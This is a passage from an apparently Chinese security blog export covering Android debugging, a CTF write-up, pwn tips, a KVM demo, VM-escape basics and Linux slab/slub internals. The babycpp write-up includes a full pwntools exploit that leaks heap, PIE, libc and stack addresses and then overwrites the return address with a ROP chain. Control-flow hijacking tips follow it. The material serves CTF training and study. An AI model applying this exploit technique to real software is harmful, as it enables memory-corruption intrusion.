studio中的源代码,回编译的apk是安装在被调试系统中的中的. smalidea-0.05.zip插件是Android studio的插件,用于smali源码级别下断点. AS调试:Run –&gt; Edit Configurations,点击+号,添加Remote配置,选择localhost:8700然后apply即可,可在Debugger窗口查看变量等. 12adb install test_signed.apkadb shell am start -D -n com.yaotong.crackme/.MainActivity 此时就可以用IDA或者AS对apk进行smali层的动态调试.要调试native层的话需要用到IDA. 123456adb push android_x86_server /data/local/tmpadb shellcd /data/local/tmpsuchmod 777 android_x86_server./android_x86_server 12adb forward tcp:23946 tcp:23946adb shell am start -D -n com.yaotong.crackme/.MainActivity 使用x86的IDA选择Debugger -&gt; Attach -&gt; Remote ARMLinux/Android debugger,在Debug options中勾选Events的后四项,然后设置ip连接即可. 连接之后选择要调试的进程即可进入调试,点击运行,此时会卡住. 1jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost 此时可以开始调试了,在Modules找到要调试的so,双击获得符号表(没有的话右键分析也可以获取函数列表),选择目标函数下断点进行调试即可. 反调试大多数情况会在init_array或者JNI_Onload开启线程检测TracePid或者端口23946之类的,因为程序启动的时候JNI_Onload和init_array是在主界面启动之前响应.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-强网杯-2019-babycpp]]></title>
    <url>%2Fposts%2F7d044205%2F</url>
    <content type="text"><![CDATA[babycpp update函数中经典abs漏洞,可以修改C++类的vtable指针,爆破4位(1/16). 通过string和int四个函数交互使用任意地址读写,通过libc中的environ变量泄露栈地址,最后写返回地址rop即可. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *context.log_level = 'debug'def new_array(choice): r.sendlineafter("Your choice:", "0") r.sendlineafter("Your choice:", str(choice))def show(index, idx): r.sendlineafter("Your choice:", "1") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx))def set_element_int(index, idx, val): r.sendlineafter("Your choice:", "2") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx)) r.sendlineafter("Input val:", hex(val))def set_element_string(index, idx, content, len = -1): r.sendlineafter("Your choice:", "2") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx)) if len != -1: r.sendlineafter("len of the obj:", str(len)) r.sendafter("Input your content:", content)def update(index, idx, content): r.sendlineafter("Your choice:", "3") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx)) r.sendafter("Input hash:", content)while(1): r = process("./babycpp") new_array(2)#0 new_array(1)#1 set_element_string(0, 0, "w4rd3n", 0x100) update(0, 0x80000000, p16(0x1ce0)) try: show(0, 0) heap = int(r.recvline().split()[-1], 16) except EOFError as e: r.close() continue breakupdate(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(heap - 0xc0) + p64(0x100))update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))show(0, 0)pie = u64(r.recvline()[8:-1].ljust(8, "\x00")) - 0x201ce0update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(pie + 0x202030) + p64(0x100))update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))show(0, 0)libc = u64(r.recvline()[8:-1].ljust(8, "\x00")) - 0x7fdef0e348e0 + 0x7fdef0a70000update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(libc + 0x3c6f38) + p64(0x100))#environupdate(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))show(0, 0)stack = u64(r.recvline()[8:-1].ljust(8, "\x00"))main_ret = stack - 0xf0update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(main_ret) + p64(0x100))update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(pie + 0x1693) + p64(libc + 0x18cd57) + p64(libc + 0x45390))r.sendlineafter("Your choice:", "4")#gdb.attach(r)print "pie: " + hex(pie)print "heap: " + hex(heap)print "libc: " + hex(libc)print "main_ret: " + hex(main_ret)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-tips]]></title>
    <url>%2Fposts%2F55f9f316%2F</url>
    <content type="text"><![CDATA[劫持控制流 返回地址 最直接的劫持方法,需要栈溢出,越界读写,格式化字符串之类的漏洞,或者泄露栈地址的任意写. got表 got表未开保护的情况下可以覆写got表. vtable 各种函数表,典型有IO_FILE结构体的vtable和CPP中每个类的虚函数表. hook变量 当_malloc_hook不为NULL时会执行*_malloc_hook,调用malloc时触发. 当_free_hook不为NULL时会执行*_free_hook,调用free时触发. 当_dl_open_hook不为NULL时会执行**_dl_open_hook,常见触发条件是当malloc或free出错时. 泄露地址 libc got表,栈中残余参数,攻击stdout结构体. stack 栈中残余参数,libc中的environ变量. 堆地址 栈中残余参数,bin链表指针. others 当ELF文件比较小的时候,不同区段可能会被多次映射.例题:jarvis smashes.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-Linux-kvm-基础]]></title>
    <url>%2Fposts%2Fc2e4ef5d%2F</url>
    <content type="text"><![CDATA[概览 kvm(kernel-based virtual machine)是一个开源软件,是x86架构硬件支持虚拟化技术(如Intel-VT或AMD-V)的Linux实现,它包含一个为处理器提供底层虚拟化的可加载的核心模块kvm.ko(kvm-intel.ko或kvm-amd.ko). 该内核模块使得Linux变成了一个Hypervisor.Linux-2.6.20以上的内核均包含了kvm核心. kvm所支持的功能. CPU和内存超分(Overcommit). 半虚拟化I/O(virtio). 热插拔(cpu,块设备,网络设备等). 对称多处理(Symmetric Multi-Processing,SMP). 实时迁移(Live Migration). PCI设备直接分配和单根I/O虚拟化(SR-IOV). 内核同页合并(KSM). NUMA(Non-Uniform Memory Access,非一致存储访问结构). 配合kvm使用的软件. libvirt:操作和管理kvm虚拟机的虚拟化API,使用C语言编写,可以由Python,Ruby等语言调用.可以操作包括kvm,vmware,XEN,Hyper-v,LXC等Hypervisor. virsh:基于libvirt的命令行工具(CLI). virt-Manager:基于libvirt的GUI工具. virt-v2v:虚拟机格式迁移工具. virt-install:创建kvm虚拟机的命令行工具. virt-viewer:连接kvm虚拟机屏幕的工具. virt-clone:kvm虚拟机克隆工具. virt-*系列工具. kvm不提供硬件虚拟化操作,其I/O操作等都借助qemu来完成. /dev/kvm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;err.h&gt;#include &lt;fcntl.h&gt;#include &lt;linux/kvm.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;int main() &#123; int kvm, vmfd, vcpufd, ret; const uint8_t code[] = &#123; 0xba, 0xf8, 0x03, /* mov $0x3f8, %dx */ 0x00, 0xd8, /* add %bl, %al */ 0x04, '0', /* add $'0', %al */ 0xee, /* out %al, (%dx) */ 0xb0, '\n', /* mov $'\n', %al */ 0xee, /* out %al, (%dx) */ 0xf4, /* hlt */ &#125;; uint8_t * mem; struct kvm_sregs sregs; size_t mmap_size; struct kvm_run * run; //打开KVM设备 kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC); //获取KVM设备版本 ret = ioctl(kvm, KVM_GET_API_VERSION, NULL); //创建虚拟机 vmfd = ioctl(kvm, KVM_CREATE_VM, (unsigned long)0); //为虚拟机申请内存,并将代码(镜像)加载到虚拟机内存中 mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); memcpy(mem, code, sizeof(code)); //页表空间的前4K是留给页表目录,所以客户机物理地址从0x1000开始 struct kvm_userspace_memory_region region = &#123; .slot = 0, .guest_phys_addr = 0x1000, .memory_size = 0x1000, .userspace_addr = (uint64_t)mem, &#125;; //设置KVM的内存区域 ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region); //创建虚拟CPU vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (unsigned long)0); //获取KVM运行时结构的大小 ret = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, NULL); mmap_size = ret; if (mmap_size &lt; sizeof(*run)) errx(1, "KVM_GET_VCPU_MMAP_SIZE unexpectedly small"); //将kvm_run与vcpu做关联，这样能够获取到kvm的运行时信息 run = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, 0); if (!run) err(1, "mmap vcpu"); //获取特殊寄存器 ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs); //设置代码段为0 sregs.cs.base = 0; sregs.cs.selector = 0; //设置特殊寄存器 ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs); //设置代码的入口地址,如果是正式的镜,rip的值应该是类似引导扇区加载进来的指令的地址 struct kvm_regs regs = &#123; .rip = 0x1000, .rax = 2, .rbx = 2, .rflags = 0x2, &#125;; ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs); //qemu-kvm会用一个线程来执行这个vCPU并加载指令 while (1) &#123; //运行虚拟机 ret = ioctl(vcpufd, KVM_RUN, NULL); //获取虚拟机退出原因 switch (run-&gt;exit_reason) &#123; case KVM_EXIT_HLT: puts("KVM_EXIT_HLT"); return 0; ////代码中调用了out指令,vmx模式下不允许执行这个操作,所以将操作权切换到了宿主机,切换的时候会将上下文保存到VMCS寄存器 case KVM_EXIT_IO: if (run-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp; run-&gt;io.size == 1 &amp;&amp; run-&gt;io.port == 0x3f8 &amp;&amp; run-&gt;io.count == 1) putchar(*(((char *)run) + run-&gt;io.data_offset)); else errx(1, "unhandled KVM_EXIT_IO"); break; case KVM_EXIT_FAIL_ENTRY: errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx", (unsigned long long)run-&gt;fail_entry.hardware_entry_failure_reason); case KVM_EXIT_INTERNAL_ERROR: errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x", run-&gt;internal.suberror); default: errx(1, "exit_reason = 0x%x", run-&gt;exit_reason); &#125; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-escape-Linux-VM逃逸基础]]></title>
    <url>%2Fposts%2F2b6e7be%2F</url>
    <content type="text"><![CDATA[简介 虚拟机是一种特殊的软件,依靠某种环境(操作系统)运行,同时又作为其他软件的运行环境. 简单说虚拟机是计算机系统的仿真器,通过软件模拟具有完整硬件系统功能的,运行在一个完全隔离环境中的完整计算机系统,能提供物理计算机的功能. 对于虚拟机逃逸来说,其实就是要攻击虚拟机管理程序hypervisor.通常把主机环境称为host,虚拟机环境称为guest. 常见的漏洞形式 Device 在qemu中新实现一种设备并引入漏洞,guest通过与设备进行交互进行漏洞利用. 在host上使用qemu-system-x86_64 -device help查看qemu支持的设备.也可以boot到guest之后使用lspci -nvv来查看pci设备的具体信息. Linux kernel与设备通信有PIO,MMIO,DMA等形式,通常kernel会实现一套driver并在内核态与device交互,再开放API供用户态程序使用.但其实在用户态也是可以直接访问到设备的. PIO CPU执行in/out指令来向I/O端口发送数据.cat /proc/ioports能够看到目前port的一些信息和它们对应的设备. in/out指令是特权指令,一般只有在Ring 0时才能执行,linux内核提供了inb/outb/inw/outw/inl/outl,用于向port发送不同长度的数据. 在linux中还可以通过iopl,ioperm这两个系统调用对port的权能进行设置. 12#include &lt;sys/io.h&gt;int ioperm(unsigned long from, unsigned long num, int turn_on); ioperm可以将from之后的num个port打开供用户态程序使用,当在用户态执行in/out对这些port进行读写时不会触发fault.这个调用需要进程是root权限或者具有CAP_SYS_RAWIO权能. 另外,还可以通过打开/dev/port这个文件,再lseek到对应port的offset进行读写,同样可以实现PIO.如果没有/dev/port文件,可以使用mknod -m 660 /dev/port c 1 4来创建. MMIO 另一种进行交互的方式是使用MMIO,CPU将一部分设备的寄存器映射到一段特殊的物理内存地址,当进行访存时就相当于对这些寄存器进行操作. cat /proc/iomem能够看到与I/O相关的一些内存地址信息. 通过kernel提供的sysfs,可以直接映射出设备对应的内存,具体方法是打开类似/sys/devices/pci0000:00/0000:00:04.0/resource0的文件,并用mmap将其映射到进程的地址空间,就可以对其进行读写了. 这里的设备号0000:00:04.0是需要事先在/proc/iomem中看好的.内存读写会触发到qemu内设备的mmio处理函数(一般会叫xxxx_mmio_read/xxxx_mmio_write),传入的参数是写入的地址偏移和具体的值. 在qemu这边,需要对这块内存区域用memory_region_init_io进行注册,传入MemoryRegionOps结构,提供相应的读写处理函数. 另外,还可以通过打开/dev/mem这个文件直接操作物理内存,mmap设备对应的地址进行读写,也是相同的效果.如果没有/dev/mem文件,可以使用mknod -m 660 /dev/mem c 1 1来创建. 交互模板. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;unsigned char* iomem;void die(const char* msg)&#123; perror(msg); exit(-1);&#125;void iowrite(uint64_t addr, uint64_t value)&#123; *((uint64_t*)(iomem + addr)) = value;&#125;uint64_t ioread(uint64_t addr)&#123; return *((uint64_t*)(iomem + addr));&#125;void iowrite32(uint64_t addr, uint32_t value)&#123; *((uint32_t*)(iomem + addr)) = value;&#125;uint32_t ioread32(uint64_t addr)&#123; return *((uint32_t*)(iomem + addr));&#125;int main(int argc, char *argv[])&#123; int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC); if (fd == -1) die("open"); iomem = mmap(0, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if (iomem == MAP_FAILED) die("mmap"); // Do something return 0;&#125; Hypercall hypercall是guest kernel向hypervisor发出的一种调用形式,广义上说像vmtools的RPCI机制使用特定I/O端口实现的也可以称之为hypercall.还有一种方式是通过一些特权指令,例如vmmcall. 即使不在kvm模式,qemu也仍然可以通过TCG实现hypercall,具体来说就是在进行binary translation时,为vmmcall定制helper函数,完成特定的功能就可以了.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>escape</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-RTFSC-Linux-kernel-内存管理机制]]></title>
    <url>%2Fposts%2F4878e6aa%2F</url>
    <content type="text"><![CDATA[前言 引用代码基于linux-2.6.25. 简介 内核管理页面使用伙伴算法和slab/slub机制,伙伴算法以页为单位管理内存,slab/slub机制运行在伙伴系统之上,为内核提供小内存管理的功能. slab/slub暂时保留已经释放的内核对象空间以供重用,不同之处在于slab机制对内核对象的类型十分挑剔,只有类型和大小都完全一致的对象才能重用其空间,而slub只要大小差不多就可以重用同一块内存. slab分配器 在内核中会为有限的对象集(例如文件描述符和其他常见结构)分配大量内存,而对内核中普通对象初始化的时间超过对其分配和释放所需的时间,可以将释放后的内存维持为特定对象初始化的状态,后续的内存分配不需要执行初始化函数. slab就是一个使用了这种思想和其他一些思想来构建的内存分配器. slab解析 slab分配器是基于对象类型进行管理的,每种对象对应一种slab.slab分配器并不丢弃释放的对象,而是对其进行管理,分配对象时会使用最近释放的对象的内存块. cache_chain是kmem_cache指针链表的表头,用来遍历查找对应对象的kmem_cache.slab分配器使用一个kmem_cache结构来描述一种slab. 1static struct list_head cache_chain; 1234567891011121314151617181920212223242526272829303132333435363738394041struct kmem_cache &#123; struct array_cache * array[NR_CPUS];//指向包含空闲对象的本地高速缓存,每个CPU有一个该结构,当有对象释放时,优先放入本地CPU高速缓存中. unsigned int batchcount;//本地高速缓存转入和转出的大批数据数量 unsigned int limit;//本地高速缓存中空闲对象的最大数目 unsigned int shared;//说明了对称多处理器系统的共享行为 unsigned int buffer_size;//对象的大小 u32 reciprocal_buffer_size;//buffer_size的倒数,加快计算 unsigned int flags; unsigned int num;//slab中对象数量 unsigned int gfporder;//slab中内存页数量 gfp_t gfpflags;//与伙伴系统交互时所提供的分配标识 size_t colour;//slab中的着色 unsigned int colour_off;//着色的偏移量 struct kmem_cache * slabp_cache; unsigned int slab_size;//slab缓冲区的大小 unsigned int dflags; void (*ctor)(struct kmem_cache *, void *); const char * name; struct list_head next;#if STATS//统计状态的变量 unsigned long num_active; unsigned long num_allocations; unsigned long high_mark; unsigned long grown; unsigned long reaped; unsigned long errors; unsigned long max_freeable; unsigned long node_allocs; unsigned long node_frees; unsigned long node_overflow; atomic_t allochit; atomic_t allocmiss; atomic_t freehit; atomic_t freemiss;#endif#if DEBUG//用于调试的变量 int obj_offset; int obj_size;#endif//用于组织slab的结点链表,此高速缓存可能在不同NUMA的结点都有slab链表 struct kmem_list3 * nodelists[MAX_NUMNODES];&#125;; array_cache记录本地cpu高速缓存的信息,用于跟踪最近释放的对象,每次分配和释放都要直接访问它,只有当其空闲内存不足时才会从nodelists中的slab中引入一部分对象到本地高速缓存中,而nodelists中的空闲对象也不足时,那么就要从伙伴系统中引入新的页来建立新的slab. 12345678struct array_cache &#123; unsigned int avail;//当前cpu可用对象数量 unsigned int limit;//最大的对象数量,当超过这个值时将对象返回给伙伴系统 unsigned int batchcount;//一次转入和转出的对象数量 unsigned int touched;//标示本地cpu最近是否被使用 spinlock_t lock;//自旋锁 void *entry[];&#125;; kmem_list3描述了slab的状态,包含三个slab队列,分别储存三种状态的slab:Full,Partial,Empty. 12345678910111213struct kmem_list3 &#123; struct list_head slabs_partial; struct list_head slabs_full; struct list_head slabs_free; unsigned long free_objects;//空闲对象的个数 unsigned int free_limit;//空闲对象的上限 unsigned int colour_next;//即将要着色的下一个 spinlock_t list_lock;//自旋锁 struct array_cache * shared; struct array_cache * * alien; unsigned long next_reap; int free_touched;&#125;; 12345678struct slab &#123; struct list_head list;//用于将slab连入keme_list3的链表 unsigned long colouroff;//该slab的着色偏移 void * s_mem;//指向slab中的第一个对象 unsigned int inuse;//已经分配出去的对象数量 kmem_bufctl_t free;//下一个空闲对象的下标 unsigned short nodeid;//节点标识符&#125;; slab分配器的slab缓冲区结构如下. 每个slab为一个或多个连续的内存页,被划分成一个个对象.对象是从slab中进行分配和释放的基本元素.Empty列表中的slab是进行回收的主要备选对象,通过此过程slab所使用的内存被返回给操作系统供其他用户使用. 当一个slab中的所有对象都被使用完时,就从Partial列表中移动到Full列表中. 当一个slab中的部分对象在被使用时,就从其他列表中移动到Partial列表中. 当一个slab中的所有对象都被释放之后,就从Partial列表移动到Empty列表中. slab分配器还可以支持硬件缓存对齐和着色,这允许不同kmem_cache中的对象占用相同的缓存行,从而提高缓存的利用率并获得更好的性能. api函数 静态定义kmem_cache结构. 1struct struct kmem_cache * my_cachep; 内核函数kmem_cache_create用来创建kmem_cache.这通常是在内核初始化或者首次加载内核模块时执行.此时并没有向kmem_cache分配任何内存. 123456struct kmem_cache * kmem_cache_create (const char * name, size_t size, size_t align, unsigned long flags, void (*ctor)(struct kmem_cache *, void *));//name:kmem_cache名称,proc文件系统(/proc/slabinfo)使用它标识一种slab//size:kmem_cache中对象大小//align:kmem_cache中对象必需的对齐//flags:指定为kmem_cache启用的选项//ctor:定义了一个可选的对象构造器 内核函数kmem_cache_destroy用来销毁kmem_cache.这通常是在内核模块被卸载时执行,调用这个函数时kmem_cache必须为空.该函数也可能会引起阻塞.因此不能在中断上下文中使用. 1void kmem_cache_destroy(struct kmem_cache * cachep); 内核函数kmem_cache_alloc函数用来从kmem_cache中获取对象,调用者提供kmem_cache指针以及一组标志.kmem_cache_alloc的flags选项与kmalloc的flags选项相同. GFP_USER为用户分配内存(这个调用可能会睡眠). GFP_KERNEL从内核RAM中分配内存(这个调用可能会睡眠). GFP_ATOMIC使该调用强制处于非睡眠状态. GFP_HIGHUSER从高端内存中分配内存. 首先检测其Partial列表,如果非空,就选择一个slab返回一个指向已分配但未使用的对象的指针,为空则检测Empty列表,如果非空,同上.如果也为空则只能调用kmem_getpages创建一个新的slab. 1void * kmem_cache_alloc(struct kmem_cache * cachep, gfp_t flags); 内核函数kmem_cache_zalloc与kmem_cache_alloc类似,只不过它对对象执行memset操作,用来在将对象返回调用者之前对其进行清除操作. 内核函数kmem_cache_free将一个对象释放回kmem_cache中对应的slab,调用者提供kmem_cache指针和要释放的对象. 1void kmem_cache_free(struct kmem_cache * cachep, void * objp); 内核中最常用的内存管理函数是kmalloc和kfree函数. kmalloc循环遍历可用kmem_cache来查找对应的kmem_cache,然后使用kmem_cache_alloc分配对象. kfree通过调用virt_to_cache确定对象所对应的kmem_cache,然后使用kmem_cache_free释放对象. 12void * kmalloc(size_t size, int flags);void kfree(const void * objp); kmem_cache_size函数会返回kmem_cache所管理的对象的大小.kmem_cache_name函数会返回kmem_cache的名称. kmem_cache可以通过调用kmem_cache_shrink释放其中的空闲slab进行收缩.(由内核定期自动执行的,通过kswapd,也叫做回收) 123unsigned int kmem_cache_size(struct kmem_cache * cachep);const char *kmem_cache_name(struct kmem_cache * cachep);int kmem_cache_shrink(struct kmem_cache * cachep); proc接口 proc文件系统提供了一种简单的方法来监视系统中所有活动的kmem_cache,/proc/slabinfo./proc/slabinfo除了提供一些可以从用户空间访问的可调整参数之外,还提供了有关所有kmem_cache的详细信息. 要调优特定的kmem_cache,可以简单地向/proc/slabinfo文件中以字符串的形式传递kmem_cache名称和3个可调整的参数(limit,batchcount,shared_factor). 1echo "cache_name limit batchcount shared_factor" &gt; /proc/slabinfo slob分配器 对于小型的嵌入式系统来说,存在一个slab模拟层--slob.在禁用CONFIG_SLAB时,内核会使用slob分配器. slub分配器 随着大规模多处理器系统和NUMA系统的广泛应用,slab分配器逐渐暴露出自身的严重不足.Linux内核2.6.22版本中引入一种新的解决方案:slub分配器. slub解析 slub分配器中每个node结点的三个队列精简为了一个队列,只保留了部分空slab队列.slub分配器中每个cpu直接使用单个slab并维护自己的一个部分空链表.slub分配器中每个node结点也没有了所有cpu共享的空闲对象链表.slub分配器的kmem_cache结构相对slab而言简化了不少,而且没有了队列的相关字段.slub分配器具有缓冲区合并的功能:当内核执行绪请求创建新的缓冲区C2时,slub分配器会先搜索已创建的缓冲区,如果发现某缓冲区C1的对象大小略大于C2,则重用C1. 1234567891011121314151617181920212223242526272829//mm/slub.cstruct kmem_cache &#123; unsigned long flags;//标志 int size;//分配给对象的内存大小,包括下个空闲对象指针 int objsize;//对象的实际大小 int offset;//存放空闲对象指针的偏移量 int order;//当前优先分配顺序 struct kmem_cache_node local_node; int objects;//slab中对象的数量 gfp_t allocflags;//每一次分配时所使用的标志 int refcount;//重用计数器,当用户请求创建新的slub种类时,slub分配器重用已创建的相似大小的slub void (*ctor)(struct kmem_cache *, void *); int inuse;//元数据的偏移量 int align;//对齐 const char *name; struct list_head list;//所有的kmem_cache结构都会链入这个链表,链表头是slab_caches#ifdef CONFIG_SLUB_DEBUG struct kobject kobj;//sysfs文件系统在/sys中会有个slub的专用目录#endif#ifdef CONFIG_NUMA int remote_node_defrag_ratio;//该值越小,越倾向于在本结点分配对象 struct kmem_cache_node * node[MAX_NUMNODES];//用于组织slab,分为多个节点#endif#ifdef CONFIG_SMP struct kmem_cache_cpu * cpu_slab[NR_CPUS];#else struct kmem_cache_cpu cpu_slab;#endif&#125;; 每个处理器都有一个本地活动slab,由kmem_cache_cpu结构描述. 1234567891011121314151617181920struct kmem_cache_cpu &#123; void * * freelist;//指向下一个空闲对象 struct page * page;//cpu当前所使用的slab缓冲区描述符 int node; unsigned int offset; unsigned int objsize;#ifdef CONFIG_SLUB_STATS unsigned stat[NR_SLUB_STAT_ITEMS];#endif&#125;;struct kmem_cache_node &#123; spinlock_t list_lock;//锁 unsigned long nr_partial; atomic_long_t nr_slabs;//该node中此kmem_cache的所有slab的数量 struct list_head partial;#ifdef CONFIG_SLUB_DEBUG struct list_head full;#endif&#125;; 创建处理器活动slab时,第一个空闲对象的指针被复制到kmem_cache_cpu结构的freelist字段中. 内核执行绪申请对象时,直接从所在处理器的kmem_cache_cpu结构的freelist字段获得第一个空闲对象的地址,然后更新freelist字段,使其指向下一个空闲对象.当本地活动slab没有空闲对象时,slub分配器优先从处理器所在节点的Partial队列中分配一个slab作为新的本地活动slab,其次从其它节点中分配slab. 释放对象时,如果对象属于所在处理器的活动slab 中,直接将其添加到空闲对象队列的队首,并更新freelist字段.否则的话,对象一定属于某Partial中.如果释放操作使得该Partial转变成Empty状态,则释放该slab. 虽然对象分配和释放的操作只针对处理器本地的活动slab,但是在某些特殊的情况下会为当前处理器创建新的活动slab并把原先未用完的活动slab加到NUMA节点的Partial队列中(例如,在处理器A上运行的某内核执行绪申请对象,但是A的活动slab中已经没有空闲对象,因此必须创建新的slab.但是创建slab的操作可能导致睡眠,所以当创建操作完成后该执行绪可能被调度到处理器B上,这将停止使用B原有的活动slab,并将其加入B所在节点的Partial队列中). slub分配器的slab缓冲区结构中没有对象描述符数组,没有额外的空闲对象队列,而是重用了空闲对象自身的空间.每个空闲对象有一个指向下一个空闲对象的指针. slub的调试代码总是可用,一旦激活slab_debug选项,用户就可以很方便地选择单个或一组指定的缓冲区进行动态调试. 内核函数常常需要临时分配一块任意大小的物理地址连续的内存空间,如果请求不频繁的话,则没有必要创建单独的缓冲区.Linux内核为这种请求准备了一组特定大小的通用对象缓冲区.调用kmalloc函数就可以得到符合请求大小的内存空间,调用kfree则释放该内存空间. 内核初始化时,创建一组共13个通用对象的缓冲区.kmalloc_caches数组存放了这些缓冲区的kmem_cache数据结构.由于kmem_cache数据结构是通过kmalloc来分配的,故而只能用静态分配的kmem_cache结构数组来描述通用对象的缓冲区. 其中kmalloc_caches[0]代表的缓冲区专门分配kmem_cache_node结构.kmalloc_caches[1]缓冲区对象大小为64,kmalloc_caches[2]缓冲区对象大小为192,其余第i(3 ~ 12)号缓冲区对象大小为2 ^ i.如果请求分配超过物理页面大小的对象,直接调用页框分配器. 为了满足老式ISA设备的需要,内核还使用DMA内存创建了13个通用对象的缓冲区,用kmalloc_caches_dma数组存放相应的kmem_cache结构. api函数 为了保证内核其它模块能够无缝迁移到slab分配器,slab还保留了原有slab分配器所有的接口api函数. kmem_cache_create:创建新的缓冲区. kmem_cache_destroy:销毁缓冲区,因为存在重用缓冲区的情况,只有当kmem_cache结构的refcount字段为0时才真正销毁. kmem_cache_alloc:从处理器本地的活动slab中分配对象. kmem_cache_alloc_node:如果指定的NUMA节点与本处理器所在节点不一致,则先从指定节点上获取slab,替换处理器活动slab,然后分配对象. kmem_cache_free:释放对象.如果对象属于某Partial队列且释放操作使这个slab转变成Empty状态,则释放该slab. kmem_ptr_validate:检查给定对象的指针是否合法. kmem_cache_size:返回对象实际大小. kmem_cache_shrink:检查各个节点的Partial队列,回收实际处于Empty状态的slab,并将剩余的slab按已分配对象的数目排序. kmalloc:从通用缓冲区中分配一个对象. kmalloc_node:从通用缓冲区中分配一个属于指定NUMA节点的对象. kfree:释放一个通用对象. ksize:返回分配给对象的内存大小(可能大于对象的实际大小). slab_alloc &amp; slab_free kmem_cache_alloc和kmem_cache_alloc_node函数都是直接调用slab_alloc函数,只是kmem_cache_alloc传入的node参数为-1.kmem_cache_free则调用slab_free函数. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899//mm/slub.cstatic __always_inline void *slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node, void *addr) &#123; void * * object; struct kmem_cache_cpu * c; unsigned long flags; local_irq_save(flags); c = get_cpu_slab(s, smp_processor_id()); //获取本处理器的kmem_cache_cpu数据结构 if (unlikely(!c-&gt;freelist || !node_match(c, node))) //假如当前活动slab没有空闲对象,或本处理器所在节点与指定节点不一致,则调用__slab_alloc函数. object = __slab_alloc(s, gfpflags, node, addr, c); else &#123; //获得第一个空闲对象的指针,然后更新指针使其指向下一个空闲对象. object = c-&gt;freelist; c-&gt;freelist = object[c-&gt;offset]; stat(c, ALLOC_FASTPATH); &#125; local_irq_restore(flags); if (unlikely((gfpflags &amp; __GFP_ZERO) &amp;&amp; object)) memset(object, 0, c-&gt;objsize); return object; //返回对象地址&#125;static void *__slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node, void *addr, struct kmem_cache_cpu *c) &#123; void * * object; struct page * new; gfpflags &amp;= ~__GFP_ZERO; if (!c-&gt;page) //如果没有本地活动slab,转到new_slab获取slab goto new_slab; slab_lock(c-&gt;page); if (unlikely(!node_match(c, node))) //如果本处理器所在节点与指定节点不一致,转到another_slab goto another_slab; stat(c, ALLOC_REFILL);load_freelist: object = c-&gt;page-&gt;freelist; if (unlikely(!object)) //如果处理器活动slab没有空闲对象,转到another_slab goto another_slab; if (unlikely(SlabDebug(c-&gt;page))) goto debug; 